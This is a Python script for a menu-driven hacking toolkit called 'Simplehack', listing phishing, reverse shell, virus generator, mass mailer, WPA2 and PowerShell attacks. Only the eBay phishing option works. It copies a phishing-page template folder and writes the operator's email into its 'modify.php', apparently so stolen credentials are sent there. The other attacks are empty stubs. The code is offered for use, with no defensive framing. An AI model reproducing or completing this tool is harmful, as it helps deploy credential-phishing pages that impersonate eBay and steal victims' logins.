from pyfiglet import Figlet
from shutil import copyfile
import shutil
import os



class website_attack():

    def __init__(self):
        print("Please choose the webpage.")
        print("")
        print("1) Ebay")

        choosen_webside = int(input(""))

        if choosen_webside == 1:
            self.ebay_attack()


    def ebay_attack(self):
        phishing_email = input("Please enter your email: ")
        storage_location = input("Please enter the storage location: ")

        shutil.copytree('phishing/ebay/', storage_location)


        path = storage_location + "/modify.php"

        # Read in the file
        with open(path, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace('someone@example.com', phishing_email)

        # Write the file out again
        with open(path, 'w') as file:
            file.write(filedata)

        print("Complete...")


def reverse_attack():
    pass

def virus_attack():
    pass

def mail_attack():
    pass

def wlan_attack():
    pass

def powershell_attack():
    pass



def main_menu():
    os.system("color a")
    f = Figlet(font='slant')
    rend_text = f.renderText('Simplehack')
    print(rend_text)
    print("----------------- Created by Dante -----------------")
    print("")
    print("Please choose an option: ")
    print("")
    print("1) Website phishing attack")
    print("2) Reverse shell attack")
    print("3) Virus generator")
    print("4) Mass Mailer attacks")
    print("5) WLAN Attack (WPA2)")
    print("6) Powershell attack")
    print("")
    print("99) Exit")

    choose_attack = int(input())

    if choose_attack == 1:
        website_attack()
    elif choose_attack == 2:
        reverse_attack()
    elif choose_attack == 3:
        virus_attack()
    elif choose_attack == 4:
        mail_attack()
    elif choose_attack == 5:
        wlan_attack()
    elif choose_attack == 6:
        powershell_attack()
    elif choose_attack == 99:
        quit("Bye!")


main_menu()